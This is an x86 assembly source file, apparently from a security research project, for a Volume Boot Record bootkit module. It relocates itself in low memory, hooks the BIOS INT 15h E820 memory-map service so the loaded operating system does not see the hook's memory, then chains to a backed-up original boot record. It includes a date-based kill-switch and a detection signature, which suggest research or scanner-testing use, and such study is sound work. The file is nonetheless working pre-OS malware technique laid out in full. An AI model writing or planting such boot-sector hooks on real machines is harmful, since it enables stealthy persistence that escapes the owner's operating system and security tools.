; vbr_hook.asm - Volume Boot Record Hook Module
;
; Demonstrates VBR-level hooking that intercepts the transition
; from VBR to OS bootloader. Hooks INT 15h (memory map) to hide
; memory regions from the OS.
;
; Build: nasm -f bin -o vbr_hook.bin vbr_hook.asm
;
; Copyright (c) 2026, Barzakh Research Project
; SPDX-License-Identifier: BSD-2-Clause-Patent

[BITS 16]
[ORG 0x7C00]

; ============================================================
; VBR Entry Point
; ============================================================
vbr_start:
    cli
    xor     ax, ax
    mov     ds, ax
    mov     es, ax
    mov     ss, ax
    mov     sp, 0x7C00
    sti

    ; Relocate to 0000:0500
    mov     si, 0x7C00
    mov     di, 0x0500
    mov     cx, 256
    rep     movsw
    jmp     0x0000:vbr_relocated

; ============================================================
; Relocated VBR hook code
; ============================================================
vbr_relocated:
    ; --- Kill-switch: check CMOS date ---
    mov     al, 0x09
    out     0x70, al
    in      al, 0x71
    cmp     al, 0x28
    jae     .no_hook

    ; --- Hook INT 15h (memory map services) ---
    mov     ax, [0x0054]        ; INT 15h offset (0x15 * 4 = 0x54)
    mov     [orig_int15_off], ax
    mov     ax, [0x0056]        ; INT 15h segment
    mov     [orig_int15_seg], ax

    cli
    mov     word [0x0054], hook_int15
    mov     word [0x0056], 0x0000
    sti

.no_hook:
    ; Load original VBR from sector 3
    mov     ah, 0x02
    mov     al, 1
    mov     ch, 0
    mov     cl, 3               ; Sector 3 = original VBR backup
    mov     dh, 0
    mov     dl, 0x80
    mov     bx, 0x7C00
    int     0x13
    jc      .error

    jmp     0x0000:0x7C00

.error:
    mov     si, msg_err
    call    print_str
    jmp     $

; ============================================================
; INT 15h Hook - Memory Map Manipulation
; ============================================================
hook_int15:
    pushf

    ; Check for E820 memory map call (AX=E820h, EDX='SMAP')
    cmp     ax, 0xE820
    jne     .pass_int15
    cmp     edx, 0x534D4150     ; 'SMAP'
    jne     .pass_int15

    ; Call original to get the real entry
    popf
    pushf
    call    far [cs:orig_int15_off]

    ; Check if the returned region overlaps our hidden area (0x500-0x700)
    ; If so, adjust the base to skip over us
    push    eax
    mov     eax, [es:di]        ; Base address low 32 bits
    cmp     eax, 0x0400
    jb      .no_adjust
    cmp     eax, 0x0800
    ja      .no_adjust
    ; Adjust: move base past our code
    mov     dword [es:di], 0x0800
.no_adjust:
    pop     eax
    iret

.pass_int15:
    popf
    jmp     far [cs:orig_int15_off]

; ============================================================
; Utility
; ============================================================
print_str:
    lodsb
    or      al, al
    jz      .done
    mov     ah, 0x0E
    mov     bx, 0x0007
    int     0x10
    jmp     print_str
.done:
    ret

; ============================================================
; Data
; ============================================================
orig_int15_off: dw 0
orig_int15_seg: dw 0

barzakh_vbr_sig:  db 'AEGV'      ; Scanner detection marker

msg_err:        db 'VBR err', 0

; Pad to 512 bytes
times 510 - ($ - $$) db 0
dw 0xAA55
